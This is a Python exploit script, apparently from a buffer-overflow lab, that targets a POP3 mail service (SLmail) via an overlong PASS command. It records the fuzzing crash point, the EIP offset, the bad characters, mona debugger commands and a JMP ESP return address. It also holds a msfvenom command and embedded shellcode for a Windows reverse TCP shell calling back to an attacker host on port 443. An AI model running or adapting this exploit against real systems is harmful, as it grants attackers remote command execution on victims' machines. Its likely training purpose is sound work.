import buff

import custom


target = ("10.10.39.66", 110)
runner = buff.Buff(target = target, prefix = "PASS ", postfix = "\r\n")


"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 2700
runner.setFuzzer(custom.fuzz)
# runner.fuzz(step_size = 100)



# ----- 2. Send Unique Characters -----
# Set Buffer Size
BUFFER_SIZE = 2900
runner.setBufferSize(BUFFER_SIZE)


# Set Custom Sender
runner.setSender(custom.send)
# runner.sendPattern()



# ----- 3. Find EIP Offset -----
"""
!mona findmsp -distance 2900
"""
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "39694438")
# print(offset)

# Set Eip offset
EIP_OFFSET = 2606
runner.setEipOffset(EIP_OFFSET)



# ----- 4. Find Bad Characters -----
"""
Possible: 23 24 3c 3d 83 84 ba

!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00\x0a\x0d"
!mona compare -f C:\mona\SLmail\bytearray.bin -a 0255A128
"""
# runner.sendBadChars(exclude = ["\x0a", "\x0d"])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\x00\x0a\x0d"

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" -a x86 -f c
"""

# Set return address (in reverse)5f4a358f
eip_address = "\x8f\x35\x4a\x5f"
runner.setEipAddress(eip_address)

exploit = (
    "\xda\xc6\xba\x1c\x2f\xeb\x19\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
    "\x52\x31\x56\x17\x03\x56\x17\x83\xf2\xd3\x09\xec\xf6\xc4\x4c"
    "\x0f\x06\x15\x31\x99\xe3\x24\x71\xfd\x60\x16\x41\x75\x24\x9b"
    "\x2a\xdb\xdc\x28\x5e\xf4\xd3\x99\xd5\x22\xda\x1a\x45\x16\x7d"
    "\x99\x94\x4b\x5d\xa0\x56\x9e\x9c\xe5\x8b\x53\xcc\xbe\xc0\xc6"
    "\xe0\xcb\x9d\xda\x8b\x80\x30\x5b\x68\x50\x32\x4a\x3f\xea\x6d"
    "\x4c\xbe\x3f\x06\xc5\xd8\x5c\x23\x9f\x53\x96\xdf\x1e\xb5\xe6"
    "\x20\x8c\xf8\xc6\xd2\xcc\x3d\xe0\x0c\xbb\x37\x12\xb0\xbc\x8c"
    "\x68\x6e\x48\x16\xca\xe5\xea\xf2\xea\x2a\x6c\x71\xe0\x87\xfa"
    "\xdd\xe5\x16\x2e\x56\x11\x92\xd1\xb8\x93\xe0\xf5\x1c\xff\xb3"
    "\x94\x05\xa5\x12\xa8\x55\x06\xca\x0c\x1e\xab\x1f\x3d\x7d\xa4"
    "\xec\x0c\x7d\x34\x7b\x06\x0e\x06\x24\xbc\x98\x2a\xad\x1a\x5f"
    "\x4c\x84\xdb\xcf\xb3\x27\x1c\xc6\x77\x73\x4c\x70\x51\xfc\x07"
    "\x80\x5e\x29\x87\xd0\xf0\x82\x68\x80\xb0\x72\x01\xca\x3e\xac"
    "\x31\xf5\x94\xc5\xd8\x0c\x7f\xe0\x15\x0c\xac\x9c\x27\x10\x53"
    "\xe6\xa1\xf6\x39\x08\xe4\xa1\xd5\xb1\xad\x39\x47\x3d\x78\x44"
    "\x47\xb5\x8f\xb9\x06\x3e\xe5\xa9\xff\xce\xb0\x93\x56\xd0\x6e"
    "\xbb\x35\x43\xf5\x3b\x33\x78\xa2\x6c\x14\x4e\xbb\xf8\x88\xe9"
    "\x15\x1e\x51\x6f\x5d\x9a\x8e\x4c\x60\x23\x42\xe8\x46\x33\x9a"
    "\xf1\xc2\x67\x72\xa4\x9c\xd1\x34\x1e\x6f\x8b\xee\xcd\x39\x5b"
    "\x76\x3e\xfa\x1d\x77\x6b\x8c\xc1\xc6\xc2\xc9\xfe\xe7\x82\xdd"
    "\x87\x15\x33\x21\x52\x9e\x53\xc0\x76\xeb\xfb\x5d\x13\x56\x66"
    "\x5e\xce\x95\x9f\xdd\xfa\x65\x64\xfd\x8f\x60\x20\xb9\x7c\x19"
    "\x39\x2c\x82\x8e\x3a\x65"
)
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

# runner.sendExploit()
